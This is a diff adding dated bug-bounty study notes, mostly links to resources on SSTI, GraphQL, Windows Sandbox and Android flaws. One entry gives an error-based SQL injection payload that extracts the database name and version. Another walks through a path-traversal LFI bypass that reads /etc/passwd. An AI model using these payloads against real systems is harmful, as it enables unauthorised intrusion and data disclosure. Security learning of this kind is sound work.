@@ -255,3 +255,36 @@ xargs -a dom -I@ sh -c 'python3 http://GitDorker.py -tf token -q @ -d Dorks/pack
 
 ## Jenkins Pen-Testing
 - https://github.com/gquere/pwn_jenkins
+
+
+# 📅 27-Mar-2021
+## Learn365 Notes from [Harsh Bothra](https://twitter.com/harshbothra_) Day - 85
+- [SSTI](https://twitter.com/harshbothra_/status/1375470661741645826?s=20)
+
+
+# 📅 29-Mar-2021
+## Learn365 Notes from [Harsh Bothra](https://twitter.com/harshbothra_) Day - 86
+- [Exploiting Graphql](https://twitter.com/harshbothra_/status/1375743272253943810?s=20)
+- [Exploiting Email Systems](https://twitter.com/harshbothra_/status/1376156330075987973?s=20)
+
+## SQL Injection
+```sql
+SELECT * FROM(SELECT COUNT(*),CONCAT(database(),'--',(SELECT (ELT(1=1,version()))),'--','_Y000!_',FLOOR(RAND(1)*1))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x) a
+```
+![img](https://pbs.twimg.com/media/ExlzEroWEAIYMXm?format=jpg&name=small)
+
+## LFI Bypass
+Wildcard bypass & LFI
+1. Intercepted a POST req that pointed to a local file "/usr/local/redacted/filename"
+2. tried "/etc/passwd" -> bad request
+3. "/user/local/../../etc/passwd" -> bad request
+4. "/user/local/redacted/../../../etc/passwd" -> OK
+5. LFI & bounty
+***Source: ***https://twitter.com/11xuxx/status/1252905397259767808?s=20
+
+# 📅 31-Mar-2021
+## Playing in the (Windows) Sandbox
+- https://research.checkpoint.com/2021/playing-in-the-windows-sandbox/?s=09
+
+## Common Android Application Vulnerabilities
+- https://twitter.com/harshbothra_/status/1376941691253399559?s=20
